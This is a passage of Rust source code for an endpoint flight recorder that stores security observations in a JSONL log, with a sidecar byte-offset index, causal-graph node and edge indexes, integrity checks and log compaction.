    pub total_observation_count: usize,
    pub matched_observation_count: usize,
    pub selected_observations: Vec<EndpointObservation>,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct EndpointFlightRecorderHistoryIndexEntry {
    #[serde(default)]
    pub schema_version: u8,
    pub observation_id: String,
    pub timestamp: DateTime<Utc>,
    pub event_kind: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub host_id: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub user_id: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub session_id: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub process_guid: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub parent_process_guid: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub process_image_hash: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub process_command_line_hash: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub agent_id: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub workload_id: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub approval_id: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub tool_name: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub tool_call_id: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub credential_kind: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub event_target: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub event_target_hash: Option<String>,
    pub byte_offset: u64,
    pub byte_len: u64,
}

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct EndpointFlightRecorderGraphNodeIndexEntry {
    #[serde(default)]
    pub schema_version: u8,
    pub node_id: String,
    pub kind: CausalNodeKind,
    pub label: String,
    pub first_seen: DateTime<Utc>,
    pub last_seen: DateTime<Utc>,
    #[serde(default)]
    pub attributes: BTreeMap<String, serde_json::Value>,
}

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct EndpointFlightRecorderGraphEdgeIndexEntry {
    #[serde(default)]
    pub schema_version: u8,
    pub edge_id: String,
    pub from: String,
    pub to: String,
    pub kind: CausalEdgeKind,
    pub timestamp: DateTime<Utc>,
    pub observation_id: String,
    #[serde(default)]
    pub attributes: BTreeMap<String, serde_json::Value>,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct EndpointFlightRecorderCompactionRecord {
    pub observation_id: String,
    pub timestamp: DateTime<Utc>,
    pub event_kind: String,
    pub age_seconds: u64,
    pub protected_by_receipt: bool,
    pub removed: bool,
    pub reason: String,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct EndpointFlightRecorderCompactionReport {
    pub observation_count: usize,
    pub retained_count: usize,
    pub protected_count: usize,
    pub records: Vec<EndpointFlightRecorderCompactionRecord>,
}

impl EndpointFlightRecorder {
    /// Open a JSONL-backed recorder, creating parent directories as needed.
    pub fn open(path: impl Into<PathBuf>) -> Result<Self> {
        let path = path.into();
        if let Some(parent) = path.parent() {
            if !parent.as_os_str().is_empty() {
                fs::create_dir_all(parent).with_context(|| {
                    format!(
                        "create endpoint flight recorder directory {}",
                        parent.display()
                    )
                })?;
            }
        }

        let mut recorder = Self {
            path: Some(path),
            recorder: CausalGraphRecorder::new(),
            observation_count: 0,
        };
        recorder.rebuild_from_disk()?;
        Ok(recorder)
    }

    /// Create a recorder with no backing file. Useful for tests and FFI callers
    /// that want deterministic graph behavior without filesystem side effects.
    #[must_use]
    pub fn transient() -> Self {
        Self {
            path: None,
            recorder: CausalGraphRecorder::new(),
            observation_count: 0,
        }
    }

    #[must_use]
    pub fn path(&self) -> Option<&Path> {
        self.path.as_deref()
    }

    #[must_use]
    pub fn observation_count(&self) -> usize {
        self.observation_count
    }

    #[must_use]
    pub fn graph(&self) -> &CausalGraph {
        self.recorder.graph()
    }

    #[must_use]
    pub fn snapshot(&self) -> EndpointFlightRecorderSnapshot {
        EndpointFlightRecorderSnapshot {
            path: self.path.clone(),
            observation_count: self.observation_count,
            graph: self.recorder.graph().clone(),
        }
    }

    /// Read the durable JSONL observation history without mutating recorder
    /// state. Transient recorders deliberately do not expose raw history because
    /// they have no backing log to replay from.
    pub fn read_observations(&self) -> Result<Vec<EndpointObservation>> {
        self.read_observations_from_disk()
    }

    /// Stream the durable JSONL log and retain only the newest matching
    /// observations. This keeps replay/impact history selection bounded even
    /// when the local recorder contains a much larger window than the operator
    /// asks to simulate.
    pub fn read_observation_window<F>(
        &self,
        limit: usize,
        predicate: F,
    ) -> Result<EndpointFlightRecorderHistoryWindow>
    where
        F: FnMut(&EndpointObservation) -> bool,
    {
        let Some(path) = &self.path else {
            return Err(anyhow!(
                "endpoint flight recorder history selection requires a durable backing file"
            ));
        };
        read_endpoint_observation_window(path, limit, predicate)
    }

    /// Use the durable sidecar index to retain the newest matching observations
    /// and seek directly to the selected JSONL records. The predicate is applied
    /// to index metadata, so callers can answer time/event-kind windows without
    /// parsing every retained observation.
    pub fn read_indexed_observation_window<F>(
        &self,
        limit: usize,
        predicate: F,
    ) -> Result<EndpointFlightRecorderHistoryWindow>
    where
        F: FnMut(&EndpointFlightRecorderHistoryIndexEntry) -> bool,
    {
        let Some(path) = &self.path else {
            return Err(anyhow!(
                "endpoint flight recorder indexed history selection requires a durable backing file"
            ));
        };
        read_indexed_endpoint_observation_window(path, limit, predicate)
    }

    /// Read or rebuild the durable graph-node sidecar index for high-cardinality
    /// graph-search prefiltering. The JSONL observation log remains the source of
    /// truth; stale or missing graph sidecars are regenerated from the in-memory
    /// projection derived from that log.
    pub fn read_graph_node_index(
        &self,
    ) -> Result<(PathBuf, Vec<EndpointFlightRecorderGraphNodeIndexEntry>)> {
        let Some(path) = &self.path else {
            return Err(anyhow!(
                "endpoint flight recorder graph index requires a durable backing file"
            ));
        };
        read_or_rebuild_endpoint_graph_node_index(path, self.recorder.graph())
    }

    /// Read or rebuild the durable graph-edge sidecar index for path and
    /// adjacency-aware graph query planning. Like the node index, it is derived
    /// from the JSONL observation log projection and rebuilt when stale.
    pub fn read_graph_edge_index(
        &self,
    ) -> Result<(PathBuf, Vec<EndpointFlightRecorderGraphEdgeIndexEntry>)> {
        let Some(path) = &self.path else {
            return Err(anyhow!(
                "endpoint flight recorder graph edge index requires a durable backing file"
            ));
        };
        read_or_rebuild_endpoint_graph_edge_index(path, self.recorder.graph())
    }

    /// Append observations to the durable JSONL log and project them into the
    /// in-memory causal graph.
    pub fn append_observations(&mut self, observations: &[EndpointObservation]) -> Result<()> {
        if observations.is_empty() {
            return Ok(());
        }

        if let Some(path) = &self.path {
            if let Some(parent) = path.parent() {
                if !parent.as_os_str().is_empty() {
                    fs::create_dir_all(parent).with_context(|| {
                        format!(
                            "create endpoint flight recorder directory {}",
                            parent.display()
                        )
                    })?;
                }
            }

            let mut file = OpenOptions::new()
                .create(true)
                .append(true)
                .read(true)
                .open(path)
                .with_context(|| format!("open endpoint flight recorder log {}", path.display()))?;
            let mut byte_offset = file
                .seek(SeekFrom::End(0))
                .with_context(|| format!("seek endpoint flight recorder log {}", path.display()))?;
            let mut index_entries = Vec::with_capacity(observations.len());

            for observation in observations {
                let mut bytes = serde_json::to_vec(observation).with_context(|| {
                    format!(
                        "serialize endpoint observation {}",
                        observation.observation_id
                    )
                })?;
                bytes.push(b'\n');
                file.write_all(&bytes).with_context(|| {
                    format!(
                        "write endpoint observation {} to {}",
                        observation.observation_id,
                        path.display()
                    )
                })?;
                let byte_len = bytes.len() as u64;
                index_entries.push(endpoint_observation_index_entry(
                    observation,
                    byte_offset,
                    byte_len,
                ));
                byte_offset = byte_offset.saturating_add(byte_len);
            }

            file.flush().with_context(|| {
                format!("flush endpoint flight recorder log {}", path.display())
            })?;
            append_endpoint_observation_index(path, &index_entries)?;
        }

        for observation in observations {
            self.recorder.record_observation(observation);
            self.observation_count += 1;
        }

        if let Some(path) = &self.path {
            replace_endpoint_graph_node_index(path, self.recorder.graph())?;
            replace_endpoint_graph_edge_index(path, self.recorder.graph())?;
        }

        Ok(())
    }

    /// Compact the durable JSONL log by retaining recent or receipt-protected
    /// observations and rebuilding the graph projection from the retained log.
    pub fn compact(
        &mut self,
        max_observations: Option<usize>,
        min_age_seconds: u64,
        protected_observation_ids: &BTreeSet<String>,
        dry_run: bool,
        now: DateTime<Utc>,
    ) -> Result<EndpointFlightRecorderCompactionReport> {
        let observations = self.read_observations_from_disk()?;
        let observation_count = observations.len();
        let mut retained = Vec::with_capacity(observations.len());
        let mut protected_count = 0usize;
        let mut records = Vec::new();

        for (index, observation) in observations.iter().enumerate() {
            let age_seconds = observation_age_seconds(observation, now);
            let protected = protected_observation_ids.contains(&observation.observation_id);
            let beyond_limit =
                max_observations.is_some_and(|max| observations.len().saturating_sub(index) > max);
            let old_enough = age_seconds >= min_age_seconds;

            if protected {
                protected_count = protected_count.saturating_add(1);
                retained.push(observation.clone());
                continue;
            }
            if !old_enough || max_observations.is_some() && !beyond_limit {
                retained.push(observation.clone());
                continue;
            }

            let reason = if beyond_limit {
                format!(
                    "observation exceeds max_observations {} and is at least {min_age_seconds}s old",
                    max_observations.unwrap_or_default()
                )
            } else {
                format!("observation is at least {min_age_seconds}s old")
            };
            records.push(EndpointFlightRecorderCompactionRecord {
                observation_id: observation.observation_id.clone(),
                timestamp: observation.timestamp,
                event_kind: observation.event_name().to_string(),
                age_seconds,
                protected_by_receipt: protected,
                removed: !dry_run,
                reason,
            });

            if dry_run {
                retained.push(observation.clone());
            }
        }

        if !dry_run {
            self.rewrite_observations(&retained)?;
        }

        Ok(EndpointFlightRecorderCompactionReport {
            observation_count,
            retained_count: retained.len(),
            protected_count,
            records,
        })
    }

    /// Rebuild the graph projection from the JSONL backing file.
    pub fn rebuild_from_disk(&mut self) -> Result<()> {
        let Some(path) = self.path.clone() else {
            self.recorder = CausalGraphRecorder::new();
            self.observation_count = 0;
            return Ok(());
        };

        let observations = read_endpoint_observations(&path)?;
        rewrite_endpoint_observation_index(&path, &observations)?;
        self.rebuild_from_observations(&observations);
        replace_endpoint_graph_node_index(&path, self.recorder.graph())?;
        replace_endpoint_graph_edge_index(&path, self.recorder.graph())?;

        Ok(())
    }

    fn read_observations_from_disk(&self) -> Result<Vec<EndpointObservation>> {
        let Some(path) = &self.path else {
            return Err(anyhow!(
                "endpoint flight recorder compaction requires a durable backing file"
            ));
        };
        read_endpoint_observations(path)
    }

    fn rewrite_observations(&mut self, observations: &[EndpointObservation]) -> Result<()> {
        let Some(path) = self.path.clone() else {
            return Err(anyhow!(
                "endpoint flight recorder rewrite requires a durable backing file"
            ));
        };
        if let Some(parent) = path.parent() {
            if !parent.as_os_str().is_empty() {
                fs::create_dir_all(parent).with_context(|| {
                    format!(
                        "create endpoint flight recorder directory {}",
                        parent.display()
                    )
                })?;
            }
        }

        let tmp_path = path.with_extension("jsonl.tmp");
        let mut byte_offset = 0u64;
        let mut index_entries = Vec::with_capacity(observations.len());
        {
            let mut file = OpenOptions::new()
                .create(true)
                .truncate(true)
                .write(true)
                .open(&tmp_path)
                .with_context(|| {
                    format!(
                        "open temporary endpoint flight recorder log {}",
                        tmp_path.display()
                    )
                })?;
            for observation in observations {
                serde_json::to_writer(&mut file, observation).with_context(|| {
                    format!(
                        "serialize endpoint observation {}",
                        observation.observation_id
                    )
                })?;
                file.write_all(b"\n").with_context(|| {
                    format!(
                        "write endpoint observation {} to {}",
                        observation.observation_id,
                        tmp_path.display()
                    )
                })?;
                let byte_len = serde_json::to_vec(observation)
                    .map(|mut bytes| {
                        bytes.push(b'\n');
                        bytes.len() as u64
                    })
                    .with_context(|| {
                        format!(
                            "serialize endpoint observation {} for index",
                            observation.observation_id
                        )
                    })?;
                index_entries.push(endpoint_observation_index_entry(
                    observation,
                    byte_offset,
                    byte_len,
                ));
                byte_offset = byte_offset.saturating_add(byte_len);
            }
            file.flush().with_context(|| {
                format!(
                    "flush temporary endpoint flight recorder log {}",
                    tmp_path.display()
                )
            })?;
        }
        fs::rename(&tmp_path, &path).with_context(|| {
            format!(
                "replace endpoint flight recorder log {} with {}",
                path.display(),
                tmp_path.display()
            )
        })?;
        replace_endpoint_observation_index(&path, &index_entries)?;
        self.rebuild_from_observations(observations);
        replace_endpoint_graph_node_index(&path, self.recorder.graph())?;
        replace_endpoint_graph_edge_index(&path, self.recorder.graph())?;
        Ok(())
    }

    fn rebuild_from_observations(&mut self, observations: &[EndpointObservation]) {
        self.recorder = CausalGraphRecorder::new();
        self.observation_count = 0;
        for observation in observations {
            self.recorder.record_observation(observation);
            self.observation_count += 1;
        }
    }
}

fn read_endpoint_observations(path: &Path) -> Result<Vec<EndpointObservation>> {
    let contents = match fs::read_to_string(path) {
        Ok(contents) => contents,
        Err(err) if err.kind() == ErrorKind::NotFound => return Ok(Vec::new()),
        Err(err) => {
            return Err(err)
                .with_context(|| format!("read endpoint flight recorder log {}", path.display()))
        }
    };

    let mut observations = Vec::new();
    for (idx, line) in contents.lines().enumerate() {
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }
        let observation: EndpointObservation =
            serde_json::from_str(trimmed).with_context(|| {
                format!(
                    "invalid endpoint observation JSONL at {}:{}",
                    path.display(),
                    idx + 1
                )
            })?;
        observations.push(observation);
    }
    Ok(observations)
}

fn read_endpoint_observation_window<F>(
    path: &Path,
    limit: usize,
    mut predicate: F,
) -> Result<EndpointFlightRecorderHistoryWindow>
where
    F: FnMut(&EndpointObservation) -> bool,
{
    let file = match fs::File::open(path) {
        Ok(file) => file,
        Err(err) if err.kind() == ErrorKind::NotFound => {
            return Ok(EndpointFlightRecorderHistoryWindow {
                selection_mode: "streaming_jsonl_scan".to_string(),
                index_path: None,
                ..EndpointFlightRecorderHistoryWindow::default()
            });
        }
        Err(err) => {
            return Err(err)
                .with_context(|| format!("read endpoint flight recorder log {}", path.display()))
        }
    };
    let reader = BufReader::new(file);
    let mut selected = VecDeque::new();
    let mut total_observation_count = 0usize;
    let mut matched_observation_count = 0usize;

    for (idx, line) in reader.lines().enumerate() {
        let line = line.with_context(|| {
            format!(
                "read endpoint observation JSONL line at {}:{}",
                path.display(),
                idx + 1
            )
        })?;
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }
        let observation: EndpointObservation =
            serde_json::from_str(trimmed).with_context(|| {
                format!(
                    "invalid endpoint observation JSONL at {}:{}",
                    path.display(),
                    idx + 1
                )
            })?;
        total_observation_count = total_observation_count.saturating_add(1);
        if predicate(&observation) {
            matched_observation_count = matched_observation_count.saturating_add(1);
            if limit > 0 {
                selected.push_back(observation);
                while selected.len() > limit {
                    let _ = selected.pop_front();
                }
            }
        }
    }

    Ok(EndpointFlightRecorderHistoryWindow {
        selection_mode: "streaming_jsonl_scan".to_string(),
        index_path: None,
        total_observation_count,
        matched_observation_count,
        selected_observations: selected.into_iter().collect(),
    })
}

fn read_indexed_endpoint_observation_window<F>(
    path: &Path,
    limit: usize,
    mut predicate: F,
) -> Result<EndpointFlightRecorderHistoryWindow>
where
    F: FnMut(&EndpointFlightRecorderHistoryIndexEntry) -> bool,
{
    let (index_path, index_entries) = read_or_rebuild_endpoint_observation_index(path)?;
    let (mut total_observation_count, mut matched_observation_count, mut selected_entries) =
        select_endpoint_observation_index_entries(index_entries, limit, &mut predicate);

    let selected_observations = match read_endpoint_observations_at_index_entries(
        path,
        selected_entries.clone(),
    ) {
        Ok(observations) => observations,
        Err(index_error) => {
            let index_error = index_error.to_string();
            let rebuild_error_context = format!(
                "rebuild endpoint flight recorder index after indexed read failed: {index_error}"
            );
            let rebuilt_entries =
                rebuild_endpoint_observation_index(path).with_context(|| rebuild_error_context)?;
            replace_endpoint_observation_index(path, &rebuilt_entries)?;
            let selected_after_rebuild =
                select_endpoint_observation_index_entries(rebuilt_entries, limit, &mut predicate);
            (
                total_observation_count,
                matched_observation_count,
                selected_entries,
            ) = selected_after_rebuild;
            let read_error_context = format!(
                "read endpoint flight recorder indexed window after rebuilding corrupt index: {index_error}"
            );
            read_endpoint_observations_at_index_entries(path, selected_entries)
                .with_context(|| read_error_context)?
        }
    };

    Ok(EndpointFlightRecorderHistoryWindow {
        selection_mode: "sidecar_index_seek".to_string(),
        index_path: Some(index_path),
        total_observation_count,
        matched_observation_count,
        selected_observations,
    })
}

fn select_endpoint_observation_index_entries<F>(
    index_entries: impl IntoIterator<Item = EndpointFlightRecorderHistoryIndexEntry>,
    limit: usize,
    predicate: &mut F,
) -> (usize, usize, Vec<EndpointFlightRecorderHistoryIndexEntry>)
where
    F: FnMut(&EndpointFlightRecorderHistoryIndexEntry) -> bool,
{
    let mut total_observation_count = 0usize;
    let mut matched_observation_count = 0usize;
    let mut selected_entries = VecDeque::new();

    for entry in index_entries {
        total_observation_count = total_observation_count.saturating_add(1);
        if predicate(&entry) {
            matched_observation_count = matched_observation_count.saturating_add(1);
            if limit > 0 {
                selected_entries.push_back(entry);
                while selected_entries.len() > limit {
                    let _ = selected_entries.pop_front();
                }
            }
        }
    }

    (
        total_observation_count,
        matched_observation_count,
        selected_entries.into(),
    )
}

fn read_endpoint_observations_at_index_entries(
    path: &Path,
    entries: Vec<EndpointFlightRecorderHistoryIndexEntry>,
) -> Result<Vec<EndpointObservation>> {
    let mut file = fs::File::open(path)
        .with_context(|| format!("open endpoint flight recorder log {}", path.display()))?;
    let mut observations = Vec::with_capacity(entries.len());

    for entry in entries {
        file.seek(SeekFrom::Start(entry.byte_offset))
            .with_context(|| {
                format!(
                    "seek endpoint observation {} in {}",
                    entry.observation_id,
                    path.display()
                )
            })?;
        let byte_len = usize::try_from(entry.byte_len).with_context(|| {
            format!(
                "endpoint observation {} byte length does not fit usize",
                entry.observation_id
            )
        })?;
        let mut bytes = vec![0; byte_len];
        file.read_exact(&mut bytes).with_context(|| {
            format!(
                "read endpoint observation {} from {}",
                entry.observation_id,
                path.display()
            )
        })?;
        let text = std::str::from_utf8(&bytes).with_context(|| {
            format!(
                "endpoint observation {} is not UTF-8 in {}",
                entry.observation_id,
                path.display()
            )
        })?;
        let observation: EndpointObservation =
            serde_json::from_str(text.trim()).with_context(|| {
                format!(
                    "invalid indexed endpoint observation {} in {}",
                    entry.observation_id,
                    path.display()
                )
            })?;
        if observation.observation_id != entry.observation_id {
            return Err(anyhow!(
                "endpoint observation index mismatch at {}: expected {}, found {}",
                path.display(),
                entry.observation_id,
                observation.observation_id
            ));
        }
        let observation_event_kind = observation.event_name();
        if observation_event_kind != entry.event_kind {
            return Err(anyhow!(
                "endpoint observation index event kind mismatch at {}: entry for {} expected {}, found {}",
                path.display(),
                entry.observation_id,
                entry.event_kind,
                observation_event_kind
            ));
        }
        if observation.timestamp != entry.timestamp {
            return Err(anyhow!(
                "endpoint observation index timestamp mismatch at {}: entry for {} expected {}, found {}",
                path.display(),
                entry.observation_id,
                entry.timestamp.to_rfc3339(),
                observation.timestamp.to_rfc3339()
            ));
        }
        validate_endpoint_observation_index_identity(path, &entry, &observation)?;
        observations.push(observation);
    }

    Ok(observations)
}

fn endpoint_observation_index_entry(
    observation: &EndpointObservation,
    byte_offset: u64,
    byte_len: u64,
) -> EndpointFlightRecorderHistoryIndexEntry {
    let event_target = event_target_field(observation);
    let event_target_hash = event_target_hash_field(event_target.as_deref());
    EndpointFlightRecorderHistoryIndexEntry {
        schema_version: ENDPOINT_FLIGHT_RECORDER_HISTORY_INDEX_SCHEMA_VERSION,
        observation_id: observation.observation_id.clone(),
        timestamp: observation.timestamp,
        event_kind: observation.event_name().to_string(),
        host_id: observation.host_id.clone(),
        user_id: observation.user_id.clone(),
        session_id: observation.session_id.clone(),
        process_guid: observation.process.process_guid.clone(),
        parent_process_guid: observation.process.parent_process_guid.clone(),
        process_image_hash: process_image_hash_field(observation),
        process_command_line_hash: process_command_line_hash_field(observation),
        agent_id: agent_id_field(&observation.metadata),
        workload_id: workload_id_field(&observation.metadata),
        approval_id: approval_id_field(&observation.metadata),
        tool_name: tool_name_field(observation),
        tool_call_id: tool_call_id_field(&observation.metadata),
        credential_kind: credential_kind_field(observation),
        event_target,
        event_target_hash,
        byte_offset,
        byte_len,
    }
}

fn validate_endpoint_observation_index_identity(
    path: &Path,
    entry: &EndpointFlightRecorderHistoryIndexEntry,
    observation: &EndpointObservation,
) -> Result<()> {
    let actual = endpoint_observation_index_entry(observation, entry.byte_offset, entry.byte_len);
    if actual.schema_version != entry.schema_version {
        return Err(anyhow!(
            "endpoint observation index schema mismatch at {}: entry for {} expected {}, found {}",
            path.display(),
            entry.observation_id,
            entry.schema_version,
            actual.schema_version
        ));
    }
    for (field, expected, actual) in [
        (
            "hostId",
            entry.host_id.as_deref(),
            actual.host_id.as_deref(),
        ),
        (
            "userId",
            entry.user_id.as_deref(),
            actual.user_id.as_deref(),
        ),
        (
            "sessionId",
            entry.session_id.as_deref(),
            actual.session_id.as_deref(),
        ),
        (
            "processGuid",
            entry.process_guid.as_deref(),
            actual.process_guid.as_deref(),
        ),
        (
            "parentProcessGuid",
            entry.parent_process_guid.as_deref(),
            actual.parent_process_guid.as_deref(),
        ),
        (
            "processImageHash",
            entry.process_image_hash.as_deref(),
            actual.process_image_hash.as_deref(),
        ),
        (
            "processCommandLineHash",
            entry.process_command_line_hash.as_deref(),
            actual.process_command_line_hash.as_deref(),
        ),
        (
            "agentId",
            entry.agent_id.as_deref(),
            actual.agent_id.as_deref(),
        ),
        (
            "workloadId",
            entry.workload_id.as_deref(),
            actual.workload_id.as_deref(),
        ),
        (
            "approvalId",
            entry.approval_id.as_deref(),
            actual.approval_id.as_deref(),
        ),
        (
            "toolName",
            entry.tool_name.as_deref(),
            actual.tool_name.as_deref(),
        ),
        (
            "toolCallId",
            entry.tool_call_id.as_deref(),
            actual.tool_call_id.as_deref(),
        ),
        (
            "credentialKind",
            entry.credential_kind.as_deref(),
            actual.credential_kind.as_deref(),
        ),
        (
            "eventTarget",
            entry.event_target.as_deref(),
            actual.event_target.as_deref(),
        ),
        (
            "eventTargetHash",
            entry.event_target_hash.as_deref(),
            actual.event_target_hash.as_deref(),
        ),
    ] {
        if expected != actual {
            return Err(anyhow!(
                "endpoint observation index {field} mismatch at {}: entry for {} expected {:?}, found {:?}",
                path.display(),
                entry.observation_id,
                expected,
                actual
            ));
        }
    }
    Ok(())
}

fn read_or_rebuild_endpoint_observation_index(
    path: &Path,
) -> Result<(PathBuf, Vec<EndpointFlightRecorderHistoryIndexEntry>)> {
    let index_path = endpoint_flight_recorder_index_path(path);
    if let Ok(entries) = read_endpoint_observation_index(&index_path) {
        if endpoint_observation_index_covers_log(path, &entries)? {
            return Ok((index_path, entries));
        }
    }

    let entries = rebuild_endpoint_observation_index(path)?;
    replace_endpoint_observation_index(path, &entries)?;
    Ok((index_path, entries))
}

fn rebuild_endpoint_observation_index(
    path: &Path,
) -> Result<Vec<EndpointFlightRecorderHistoryIndexEntry>> {
    let file = match fs::File::open(path) {
        Ok(file) => file,
        Err(err) if err.kind() == ErrorKind::NotFound => return Ok(Vec::new()),
        Err(err) => {
            return Err(err)
                .with_context(|| format!("read endpoint flight recorder log {}", path.display()))
        }
    };
    let mut reader = BufReader::new(file);
    let mut entries = Vec::new();
    let mut byte_offset = 0u64;
    let mut line = String::new();
    let mut line_number = 0usize;

    loop {
        line.clear();
        let byte_len = reader.read_line(&mut line).with_context(|| {
            format!(
                "read endpoint observation JSONL line at {}:{}",
                path.display(),
                line_number + 1
            )
        })?;
        if byte_len == 0 {
            break;
        }
        line_number = line_number.saturating_add(1);
        let trimmed = line.trim();
        if !trimmed.is_empty() {
            let observation: EndpointObservation =
                serde_json::from_str(trimmed).with_context(|| {
                    format!(
                        "invalid endpoint observation JSONL at {}:{}",
                        path.display(),
                        line_number
                    )
                })?;
            entries.push(endpoint_observation_index_entry(
                &observation,
                byte_offset,
                byte_len as u64,
            ));
        }
        byte_offset = byte_offset.saturating_add(byte_len as u64);
    }

    Ok(entries)
}

fn endpoint_observation_index_covers_log(
    path: &Path,
    entries: &[EndpointFlightRecorderHistoryIndexEntry],
) -> Result<bool> {
    if entries
        .iter()
        .any(|entry| entry.schema_version != ENDPOINT_FLIGHT_RECORDER_HISTORY_INDEX_SCHEMA_VERSION)
    {
        return Ok(false);
    }
    let log_len = match fs::metadata(path) {
        Ok(metadata) => metadata.len(),
        Err(err) if err.kind() == ErrorKind::NotFound => return Ok(entries.is_empty()),
        Err(err) => {
            return Err(err)
                .with_context(|| format!("stat endpoint flight recorder log {}", path.display()))
        }
    };
    let indexed_len = entries
        .last()
        .map(|entry| entry.byte_offset.saturating_add(entry.byte_len))
        .unwrap_or(0);
    Ok(indexed_len == log_len)
}

fn read_endpoint_observation_index(
    index_path: &Path,
) -> Result<Vec<EndpointFlightRecorderHistoryIndexEntry>> {
    let contents = match fs::read_to_string(index_path) {
        Ok(contents) => contents,
        Err(err) if err.kind() == ErrorKind::NotFound => return Ok(Vec::new()),
        Err(err) => {
            return Err(err).with_context(|| {
                format!(
                    "read endpoint flight recorder index {}",
                    index_path.display()
                )
            })
        }
    };

    let mut entries = Vec::new();
    for (idx, line) in contents.lines().enumerate() {
        let trimmed = line.trim();
        if trimmed.is_empty() {
            continue;
        }
        let entry: EndpointFlightRecorderHistoryIndexEntry = serde_json::from_str(trimmed)
            .with_context(|| {
                format!(
                    "invalid endpoint flight recorder index JSONL at {}:{}",
                    index_path.display(),
                    idx + 1
                )
            })?;
        entries.push(entry);
    }
    Ok(entries)
}

fn append_endpoint_observation_index(
    path: &Path,
    entries: &[EndpointFlightRecorderHistoryIndexEntry],
) -> Result<()> {
    if entries.is_empty() {
        return Ok(());
    }
    let index_path = endpoint_flight_recorder_index_path(path);
    if let Some(parent) = index_path.parent() {
        if !parent.as_os_str().is_empty() {
            fs::create_dir_all(parent).with_context(|| {
                format!(
                    "create endpoint flight recorder index directory {}",
                    parent.display()
                )
            })?;
        }
    }
    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(&index_path)
        .with_context(|| {
            format!(
                "open endpoint flight recorder index {}",
                index_path.display()
            )
        })?;
    for entry in entries {
        serde_json::to_writer(&mut file, entry).with_context(|| {
            format!(
                "serialize endpoint flight recorder index entry {}",
                entry.observation_id
            )
        })?;
        file.write_all(b"\n").with_context(|| {
            format!(
                "write endpoint flight recorder index entry {} to {}",
                entry.observation_id,
                index_path.display()
            )
        })?;
    }
    file.flush().with_context(|| {
        format!(
            "flush endpoint flight recorder index {}",
            index_path.display()
        )
    })?;
    Ok(())
}

fn rewrite_endpoint_observation_index(
    path: &Path,
    observations: &[EndpointObservation],
) -> Result<()> {
    let mut byte_offset = 0u64;
    let mut entries = Vec::with_capacity(observations.len());
    for observation in observations {
        let mut bytes = serde_json::to_vec(observation).with_context(|| {
            format!(
                "serialize endpoint observation {} for index",
                observation.observation_id
            )
        })?;
        bytes.push(b'\n');
        let byte_len = bytes.len() as u64;
        entries.push(endpoint_observation_index_entry(
            observation,
            byte_offset,
            byte_len,
        ));
        byte_offset = byte_offset.saturating_add(byte_len);
    }
    replace_endpoint_observation_index(path, &entries)
}

fn replace_endpoint_observation_index(
    path: &Path,
    entries: &[EndpointFlightRecorderHistoryIndexEntry],
) -> Result<()> {
    let index_path = endpoint_flight_recorder_index_path(path);
    if let Some(parent) = index_path.parent() {
        if !parent.as_os_str().is_empty() {
            fs::create_dir_all(parent).with_context(|| {
                format!(
                    "create endpoint flight recorder index directory {}",
                    parent.display()
                )
            })?;
        }
    }
    let tmp_path = index_path.with_extension("jsonl.tmp");
    {
        let mut file = OpenOptions::new()
            .create(true)
            .truncate(true)
            .write(true)
            .open(&tmp_path)
            .with_context(|| {
                format!(
                    "open temporary endpoint flight recorder index {}",
                    tmp_path.display()
                )
            })?;
        for entry in entries {
            serde_json::to_writer(&mut file, entry).with_context(|| {
                format!(
                    "serialize endpoint flight recorder index entry {}",
                    entry.observation_id
                )
            })?;
            file.write_all(b"\n").with_context(|| {
                format!(
                    "write endpoint flight recorder index entry {} to {}",
                    entry.observation_id,
                    tmp_path.display()
                )
            })?;
        }
        file.flush().with_context(|| {
            format!(
                "flush temporary endpoint flight recorder index {}",
                tmp_path.display()
            )
        })?;
    }
    fs::rename(&tmp_path, &index_path).with_context(|| {
        format!(
            "replace endpoint flight recorder index {} with {}",
            index_path.display(),
            tmp_path.display()
        )
    })?;
    Ok(())
}

fn endpoint_flight_recorder_index_path(path: &Path) -> PathBuf {
    let file_name = path
        .file_name()
        .map(|name| name.to_string_lossy().into_owned())
        .unwrap_or_else(|| "flight-recorder.jsonl".to_string());
    path.with_file_name(format!("{file_name}.index.jsonl"))
}

fn read_or_rebuild_endpoint_graph_node_index(
    path: &Path,
    graph: &CausalGraph,
) -> Result<(PathBuf, Vec<EndpointFlightRecorderGraphNodeIndexEntry>)> {
    let index_path = endpoint_flight_recorder_graph_index_path(path);
    if let Ok(entries) = read_endpoint_graph_node_index(&index_path) {
        if endpoint_graph_node_index_covers_graph(&entries, graph) {
            return Ok((index_path, entries));
        }
    }

    let entries = replace_endpoint_graph_node_index(path, graph)?;
    Ok((index_path, entries))
}

fn endpoint_graph_node_index_covers_graph(
    entries: &[EndpointFlightRecorderGraphNodeIndexEntry],
    graph: &CausalGraph,
) -> bool {
    if entries
        .iter()
        .any(|entry| entry.schema_version != ENDPOINT_FLIGHT_RECORDER_GRAPH_INDEX_SCHEMA_VERSION)
    {
        return false;
    }
